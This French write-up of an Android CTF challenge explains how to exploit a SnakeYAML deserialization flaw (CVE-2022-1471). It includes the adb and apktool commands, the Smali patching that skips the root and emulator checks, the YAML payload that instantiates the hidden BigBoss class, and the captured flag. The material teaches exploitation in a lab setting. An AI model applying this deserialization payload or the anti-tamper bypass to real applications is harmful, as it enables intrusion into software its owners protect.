SnakeYAML Deserialization Challenge (Android)
              
              Objectif du challenge
L’application Android snake.apk implémente plusieurs mécanismes de protection anti-reverse (détection de root, d’émulateur et de Frida via une librairie native). Elle lit un fichier YAML depuis le stockage externe et le parse avec une version vulnérable de SnakeYAML (1.33, vulnérable à CVE-2022-1471).

Le but est d’exploiter cette désérialisation unsafe pour instancier une classe cachée BigBoss. Celle-ci charge une librairie native et, lorsqu’elle reçoit la bonne chaîne en paramètre, affiche le flag dans les logs (logcat).
Niveau : Hard – pas de Frida possible (détections natives). La solution repose sur du patching Smali + une payload YAML.

              Outils utilisés
jadx-gui – analyse statique du bytecode Java

apktool – décompilation / recompilation Smali

apksigner ou uber-apk-signer – signature de l’APK patché

adb – interaction avec l’émulateur / périphérique

Émulateur Android API ≤ 28 (Android 9 ou moins)

           Démarche suivie (étapes clés)
1. Analyse statique avec jadx
Ouvrir snake.apk dans jadx-gui.
On découvre :

MainActivity : vérifie un extra Intent SNAKE valant exactement "BigBoss".

Si OK, lit /sdcard/Snake/Skull_Face.yml et parse le fichier avec SnakeYAML.

La classe com.pwnsec.snake.BigBoss possède une méthode attendant la chaîne "Snaaaaaaaaaaaaaake" pour déclencher une fonction JNI qui loggue le flag.

Capture 1.png : Décompilation avec apktool (affichage du début du processus).

2. Patch Smali pour bypasser les détections
Les protections (root, émulateur, Frida) sont implémentées en Java. On les neutralise en patchant le Smali.

bash
apktool d snake.apk -o snake_smali
Dans snake_smali/smali/com/pwnsec/snake/MainActivity.smali, on localise les conditions de détection (ex : if-eqz ou if-nez menant à finish()).
On force le saut vers la partie “safe” ou on modifie la valeur de retour à false.

Exemple de patch (capture 2.png et 3.png) :
Avant – un test de root provoque un finish() + System.exit(0).
Après – on remplace le branchement par un goto qui ignore le bloc de fin.

Recompilation et signature :

bash
apktool b snake_smali -o snake_patched.apk
apksigner sign --ks my.keystore snake_patched.apk
adb install -r snake_patched.apk
3. Création du payload YAML
Sur l’appareil (ou l’émulateur) :

bash
adb shell mkdir -p /sdcard/Snake
Créer le fichier Skull_Face.yml avec le contenu :

yaml
!!com.pwnsec.snake.BigBoss ["Snaaaaaaaaaaaaaake"]
Capture 4.png : affiche le flag récupéré via logcat | grep -i PWNSEC.

Puis le pousser :

bash
adb push Skull_Face.yml /sdcard/Snake/Skull_Face.yml
4. Déclenchement avec l’Intent
bash
adb shell am start -n com.pwnsec.snake/.MainActivity -e SNAKE BigBoss
5. Récupération du flag
bash
adb logcat | grep -i "PWNSEC"
Flag obtenu :

text
PWNSEC{W3'r3_Not_T0015_0f_The_g0v3rnm3n7_OR_4nyOn3_3ls3}
Capture “Skull_Face.yml” : montre le contenu du fichier YAML poussé sur l’appareil.

Explication des captures
Fichier	Contenu / utilité
1.png	Décompilation réussie avec apktool (chargement des ressources, baksmaling).
2.png	Extrait Smali original de onCreate – test de root menant à finish().
3.png	Patch Smali (le test est ignoré, pas d’appel à finish()).
4.png	Flag apparaissant dans logcat après exploitation.
Capture d’écran ...png	Vérification du fichier YAML poussé et de son contenu (cat).
Remarques
La vulnérabilité CVE-2022-1471 permet l’instanciation arbitraire de classes via des global tags YAML (!!com.xxx).

Le patching Smali est indispensable car Frida est détectée native.

L’émulateur doit être non rooté après patching, ou les checks Smali doivent tous être neutralisés
